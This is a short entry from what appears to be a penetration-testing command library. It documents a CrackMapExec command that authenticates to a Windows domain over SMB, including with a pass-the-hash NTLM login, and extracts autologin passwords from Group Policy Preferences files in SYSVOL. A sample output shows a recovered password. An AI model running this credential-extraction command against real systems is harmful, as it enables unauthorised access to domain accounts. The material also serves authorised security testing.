---
id: 10da687d-f00a-4d29-a4c3-613259feab29
name: CrackMapExec Extract GPP Autologin
type: command
executor: bash
data: crackmapexec smb $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH -M gpp_autologin
output: null
created_at: '2023-04-06T03:56:03.530052+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - smb
  - gpp
  - autologin
verified: true
validated: true
---

# CrackMapExec Extract GPP Autologin

## Command

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH -M gpp_autologin
```

## Description

Uses CrackMapExec to authenticate to a target via SMB and extract autologin passwords from GPP XML files in SYSVOL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP or hostname | Yes |
| -u $_USERNAME | Domain username | Yes |
| -H $_NTLM_HASH | NTLM hash of password | No (use -p for plaintext) |
| -M gpp_autologin | Module for autologin extraction | Yes |

## Examples

### Basic Usage

```bash
crackmapexec smb 192.168.1.10 -u domain\\user -p password -M gpp_autologin
```

## Expected Output

SMB         192.168.1.10    445    DOMAIN           [+] domain.com\user:password STATUS: OK  
SMB         192.168.1.10    445    DOMAIN           [+] Executing module: gpp_autologin  
GPP_Autologin 192.168.1.10  DOMAIN\\DC01    Password: AutologinPass123

## Related

- [[procedures/Automated-Password-Extraction-from-SYSVOL-and-Group-Policy-Preferences]]
- [[tools/CrackMapExec]]
